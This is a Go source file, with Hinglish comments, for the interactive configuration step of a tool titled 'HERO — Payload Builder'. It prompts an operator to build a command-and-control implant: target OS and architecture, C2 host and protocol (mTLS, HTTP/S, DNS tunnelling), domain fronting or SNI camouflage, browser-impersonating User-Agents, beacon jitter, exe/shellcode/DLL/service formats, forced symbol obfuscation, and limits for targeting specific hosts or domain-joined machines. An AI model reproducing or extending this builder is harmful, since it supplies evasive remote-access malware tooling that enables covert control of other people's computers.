//config/interactive.go
package config

import (
        "bufio"
        "fmt"
        "os"
        "strconv"
        "strings"
)

var reader = bufio.NewReader(os.Stdin)

// prompt — user se input lo, default value bhi dikhao
func prompt(question string, defaultVal string) string {
        if defaultVal != "" {
                fmt.Printf("  %s [default: %s]: ", question, defaultVal)
        } else {
                fmt.Printf("  %s: ", question)
        }

        input, _ := reader.ReadString('\n')
        input = strings.TrimSpace(input)

        if input == "" {
                return defaultVal
        }
        return input
}

// promptChoice — limited options mein se choose karo
func promptChoice(question string, choices []string, defaultVal string) string {
        fmt.Printf("  %s\n", question)
        for i, c := range choices {
                marker := "  "
                if c == defaultVal {
                        marker = "* " // default ko star se mark karo
                }
                fmt.Printf("    %s%d) %s\n", marker, i+1, c)
        }
        fmt.Printf("  Choose [default: %s]: ", defaultVal)

        input, _ := reader.ReadString('\n')
        input = strings.TrimSpace(input)

        if input == "" {
                return defaultVal
        }

        // number enter kiya
        if num, err := strconv.Atoi(input); err == nil {
                if num >= 1 && num <= len(choices) {
                        return choices[num-1]
                }
        }

        // seedha value enter kiya
        for _, c := range choices {
                if strings.EqualFold(input, c) {
                        return c
                }
        }

        fmt.Printf("  [!] Invalid choice, using default: %s\n", defaultVal)
        return defaultVal
}

// promptYesNo — haan ya na
func promptYesNo(question string, defaultVal bool) bool {
        def := "n"
        if defaultVal {
                def = "y"
        }
        fmt.Printf("  %s (y/n) [default: %s]: ", question, def)

        input, _ := reader.ReadString('\n')
        input = strings.ToLower(strings.TrimSpace(input))

        if input == "" {
                return defaultVal
        }
        return input == "y" || input == "yes"
}

// promptInt — number input lo
func promptInt(question string, defaultVal int) int {
        fmt.Printf("  %s [default: %d]: ", question, defaultVal)

        input, _ := reader.ReadString('\n')
        input = strings.TrimSpace(input)

        if input == "" {
                return defaultVal
        }

        num, err := strconv.Atoi(input)
        if err != nil {
                fmt.Printf("  [!] Invalid number, using default: %d\n", defaultVal)
                return defaultVal
        }
        return num
}

// RunInteractive — user se sawaal poochh ke PayloadConfig banao
func RunInteractive() *PayloadConfig {
        cfg := DefaultConfig()

        fmt.Println()
        fmt.Println("╔══════════════════════════════════════╗")
        fmt.Println("║     HERO — Payload Builder    ║")
        fmt.Println("╚══════════════════════════════════════╝")
        fmt.Println()

        // === TARGET ===
        fmt.Println("[1] Target Platform")
        cfg.OS = promptChoice("Operating System:", []string{"windows", "linux", "darwin"}, cfg.OS)
        cfg.Arch = promptChoice("Architecture:", []string{"amd64", "arm64", "386"}, cfg.Arch)
        fmt.Println()

        // === C2 ===
        fmt.Println("[2] C2 Connection")
        cfg.Protocol = promptChoice("Protocol:", []string{"mtls", "http", "https", "dns"}, cfg.Protocol)
        cfg.C2Host = prompt("C2 Server IP / Domain", cfg.C2Host)
        if cfg.C2Host == "" {
                fmt.Println("  [!] C2 Host zaroori hai!")
                cfg.C2Host = prompt("C2 Server IP / Domain", "")
        }
        cfg.C2Port = promptInt("C2 Port", cfg.C2Port)
        fmt.Println()

        // === C2 PROFILE ===
        // HTTP/HTTPS: User-Agent + domain fronting config
        // mTLS: Front domain for SNI camouflage (optional)
        // DNS: tunnel domain config
        fmt.Println("[3] C2 Profile")
        if cfg.Protocol == "http" || cfg.Protocol == "https" {
                cfg.UserAgent = prompt("  User-Agent (browser impersonation)", cfg.UserAgent)
                cfg.FrontDomain = prompt("  Domain Front (CDN host header, empty=none)", "")
        } else if cfg.Protocol == "mtls" {
                cfg.FrontDomain = prompt("  SNI Front Domain (empty=use C2 host directly)", "")
        } else if cfg.Protocol == "dns" {
                cfg.DNSTunnelDomain = prompt("  DNS Tunnel Domain (e.g. tunnel.yourdomain.com)", cfg.DNSTunnelDomain)
        }
        fmt.Println()

        // === ENCRYPTION — AUTO, NO USER PROMPT ===
        // Always random 32-byte PSK — no weak keys, no user input needed.
        // Builder generates cryptographically random key automatically.
        // (cfg.EncryptionKey stays empty here → builder will random-generate)
        cfg.EncryptionKey = ""
        fmt.Println()

        // === FORMAT ===
        fmt.Println("[5] Payload Format")
        cfg.Format = promptChoice("Format:", []string{"exe", "shellcode", "dll", "service"}, cfg.Format)
        fmt.Println()

        // === SESSION YA BEACON ===
        fmt.Println("[6] Connection Mode")
        cfg.IsBeacon = promptYesNo("Beacon mode? (n = interactive session)", cfg.IsBeacon)
        if cfg.IsBeacon {
                cfg.BeaconInterval = promptInt("Beacon interval (seconds)", cfg.BeaconInterval)
                cfg.BeaconJitter = promptInt("Beacon jitter (seconds)", cfg.BeaconJitter)
        }
        cfg.ReconnectInterval = promptInt("Reconnect interval on failure (seconds)", cfg.ReconnectInterval)
        cfg.MaxConnectionErrors = promptInt("Max connection errors before exit", cfg.MaxConnectionErrors)
        fmt.Println()

        // === OBFUSCATION + ENCRYPTION — AUTO, NO PROMPT ===
        // Always enabled — no weak/unencrypted payloads allowed.
        // Garble obfuscation on by default (fallback to go build if not installed).
        // Encryption key auto-generated random 32 bytes by builder.
        cfg.ObfuscateSymbols = true
        cfg.EncryptionKey = "" // empty = builder generates random 32-byte key

        // === LIMITS ===
        fmt.Println("[7] Kill Switch / Limits (optional — press Enter to skip)")
        cfg.LimitHostname = prompt("Run only on hostname", "")
        cfg.LimitUsername = prompt("Run only for username", "")
        cfg.LimitDatetime = prompt("Expire after date (YYYY-MM-DD)", "")
        cfg.LimitDomainJoined = promptYesNo("Run only on domain-joined machines?", false)
        fmt.Println()

        // === OUTPUT ===
        fmt.Println("[8] Output")
        cfg.PayloadName = prompt("Payload name (empty = random)", "")
        cfg.OutputDir = prompt("Output directory", cfg.OutputDir)
        fmt.Println()

        // B-M4: Validate() was previously never called from RunInteractive,
        // so operator-typos (invalid C2 host, bad port, etc.) only surfaced
        // deep inside the builder — far from the input that caused them.
        // We now run Validate() here and WARN on failure (not fatal) so the
        // operator can still proceed if they really know what they're doing.
        if err := cfg.Validate(); err != nil {
                fmt.Printf("[!] Config validation warning: %v\n", err)
                fmt.Println("[!] Proceeding anyway — operator's choice respected")
        } else {
                fmt.Println("[+] Config validated OK")
        }
        fmt.Println()

        return cfg
}